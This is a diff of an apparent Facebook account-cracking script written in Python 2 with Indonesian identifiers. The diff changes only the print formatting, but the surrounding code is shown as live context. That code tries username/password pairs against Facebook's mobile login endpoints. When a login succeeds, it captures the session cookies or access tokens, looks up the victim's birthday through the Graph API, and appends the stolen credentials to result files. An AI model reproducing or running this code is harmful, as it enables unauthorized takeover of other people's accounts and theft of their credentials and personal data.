@@ -354,7 +354,7 @@ class ngentod:
                 sys.stdout.flush()
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
-                print '\r%s╠═[OK] %s • %s • %s ' % (H,user,pw,response.json()['access_token'])
+                print '\r%s╠[OK] %s • %s • %s ' % (H,user,pw,response.json()['access_token'])
                 ok.append('%s • %s • %s' % (user,pw,response.json()['access_token']))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('[Okeh] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
                 break
@@ -365,7 +365,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s╠═[CP] %s • %s • %s %s %s  ' % (K,user,pw,day,month,year)
+                    print '\r%s╠[CP] %s • %s • %s %s %s  ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe]%s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -374,7 +374,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s╠═[CP] %s • %s           ' % (K,user,pw)
+                print '\r%s╠[CP] %s • %s           ' % (K,user,pw)
                 cp.append('%s • %s' % (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s\n"%(user,pw))
                 break
@@ -413,7 +413,7 @@ class ngentod:
             po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%s╠═[OK] %s • %s • %s  ' % (H,user,pw,kuki)
+                print '\r%s╠[OK] %s • %s • %s  ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Okeh] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -424,7 +424,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s╠═[CP] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s╠[CP] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe]%s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -433,7 +433,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s╠═[CP] %s • %s            ' % (K,user,pw)
+                print '\r%s╠[CP] %s • %s            ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s\n"%(user,pw))
                 break
@@ -472,7 +472,7 @@ class ngentod:
             po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%s╠═[OK] %s • %s • %s ' % (H,user,pw,kuki)
+                print '\r%s╠[OK] %s • %s • %s ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Okeh] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -483,7 +483,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s╠═[CP] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s╠[CP] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -492,7 +492,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s╠═[CP] %s • %s              ' % (K,user,pw)
+                print '\r%s╠[CP] %s • %s              ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s\n"%(user,pw))
                 break
